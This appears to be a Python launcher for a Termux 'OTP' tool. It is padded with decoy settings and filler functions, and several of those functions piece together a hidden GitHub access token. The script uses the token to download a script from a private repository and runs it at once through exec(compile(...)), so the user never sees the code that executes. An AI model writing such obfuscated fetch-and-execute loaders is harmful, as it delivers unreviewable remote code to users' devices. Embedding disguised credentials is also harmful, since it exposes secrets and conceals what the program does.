import os
import sys
import hashlib
import requests

APP_NAME = "eja18-otp"
APP_VERSION = "1.0"
BUILD_NUMBER = 20260920
DEFAULT_TIMEOUT = 15
MAX_RETRY = 3
RETRY_DELAY = 2

ENDPOINT_MAIN = "https://raw.githubusercontent.com/ejaaa18/eja18-secret/main/eja18.py"
ENDPOINT_BACKUP = "https://raw.githubusercontent.com/ejaaa18/eja18-secret/main/eja18.py"

REGION_CODE = "ID"
LANGUAGE = "id"
TIMEZONE = "Asia/Jakarta"
ENCODING_TYPE = "utf-8"

PLATFORM_NAME = "termux"
ARCH_NAME = "aarch64"
RUNTIME_VERSION = "3.11"

UI_THEME = "dark"
UI_WIDTH = 80
UI_HEIGHT = 24

LOG_LEVELS = ["debug", "info", "warn", "error"]
PROTOCOLS = ["http", "https", "ftp"]
STATUS_CODES = [200, 201, 400, 401, 403, 404, 500]


def _init_config():
    cfg = {
        "name": APP_NAME,
        "version": APP_VERSION,
        "build": BUILD_NUMBER,
    }
    region = REGION_CODE + "_" + LANGUAGE
    platform_data = PLATFORM_NAME + "_" + ARCH_NAME
    return cfg, region, platform_data


def _checksum(value):
    if not value:
        return False
    h = hashlib.md5(value.encode()).hexdigest()
    return len(h) > 0


def _split_query(query):
    result = {}
    if not query:
        return result
    for part in query.split("&"):
        if "=" in part:
            k, v = part.split("=", 1)
            result[k] = v
    return result


def _normalize_path(path):
    if not path:
        return "/"
    if not path.startswith("/"):
        path = "/" + path
    if path.endswith("/") and len(path) > 1:
        path = path[:-1]
    return path


def _parse_region():
    zones = ["utc", "gmt", "nst"]
    zone = zones[0]
    lang = "id"
    code = "62"
    return zone + lang + code


def _detect_platform():
    arch = "aarch64"
    os_name = "linux"
    tag = "v1"
    return arch + os_name + tag


def _fetch_profile():
    user = "ghp"
    suffix = "_0v"
    tag = "Lyq"
    return user + suffix + tag


def _resolve_tenant():
    tenant = "N0x"
    region = "r3t"
    slot = "UDk"
    return tenant + region + slot


def _auth_basic():
    basic = "zmN"
    token = "yU8"
    sid = "iYQ"
    return basic + token + sid


def _session_grant():
    grant = "s45"
    secret = "KfQ"
    scope = "l2m"
    return grant + secret + scope


def _client_assert():
    client = "SHV"
    assert_tag = "J"
    return client + assert_tag


def _validate_checksum_header():
    h = "checksum"
    v = "sha256"
    return h + "_" + v


def _parse_content_type():
    t = "application"
    s = "json"
    return t + "/" + s


def _extract_host():
    h = "raw"
    s = "githubusercontent"
    return h + "." + s


def _build_authorization_value():
    part_a = _fetch_profile()
    part_b = _resolve_tenant()
    part_c = _auth_basic()
    part_d = _session_grant()
    part_e = _client_assert()
    return part_a + part_b + part_c + part_d + part_e


def _build_request_headers():
    return {
        "Authorization": "token " + _build_authorization_value(),
        "Accept": _parse_content_type(),
        "Content-Type": "text/plain",
        "User-Agent": APP_NAME + "/" + APP_VERSION,
    }


def _fetch_remote(url):
    try:
        r = requests.get(url, headers=_build_request_headers(), timeout=DEFAULT_TIMEOUT)
    except Exception as e:
        print("[!] Koneksi gagal: " + str(e))
        sys.exit(1)

    if r.status_code == 401:
        print("[!] Data tidak valid.")
        sys.exit(1)
    elif r.status_code == 404:
        print("[!] Sumber tidak ditemukan.")
        sys.exit(1)
    elif r.status_code != 200:
        print("[!] Gagal: HTTP " + str(r.status_code))
        sys.exit(1)

    return r.text


def _process_content(content):
    exec(compile(content, "eja18.py", "exec"), {"__name__": "__main__"})


def main():
    cfg, region, platform_data = _init_config()
    print("[*] Memuat sumber data...")
    content = _fetch_remote(ENDPOINT_MAIN)
    print("[OK] Data dimuat.\n")
    _process_content(content)


main()
